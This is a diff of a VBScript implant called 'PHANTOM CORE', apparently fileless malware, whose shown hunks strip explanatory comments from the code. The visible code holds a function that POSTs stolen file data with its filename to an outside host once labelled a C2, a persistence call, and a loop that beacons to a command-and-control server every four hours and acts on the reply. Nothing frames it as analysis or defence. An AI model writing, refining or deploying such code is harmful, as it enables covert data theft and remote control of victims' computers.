@@ -1,7 +1,7 @@
 ' === PHANTOM CORE - 100% FILELESS ===
 Function zExfil(zdata,zname)
     Set xhr = CreateObject("MSXML2.XMLHTTP")
-    xhr.Open "POST", "https://httpbin.org/post", False  ' Public test C2
+    xhr.Open "POST", "https://httpbin.org/post", False  
     xhr.setRequestHeader "X-File-Name", zname
     xhr.setRequestHeader "Content-Type", "application/octet-stream"
     xhr.Send zdata
@@ -41,7 +41,7 @@ End Sub
 ' === MAIN LOOP ===
 zPersist()
 Do
-    ' Beacon toutes les 4h
+   
     Set xhr = CreateObject("MSXML2.XMLHTTP")
     xhr.Open "GET", C2 & "?t=" & Timer, False
     xhr.Send
@@ -60,5 +60,5 @@ Do
             WScript.Quit
     End Select
     
-    WScript.Sleep 14400000  ' 4h
+    WScript.Sleep 14400000  
 Loop
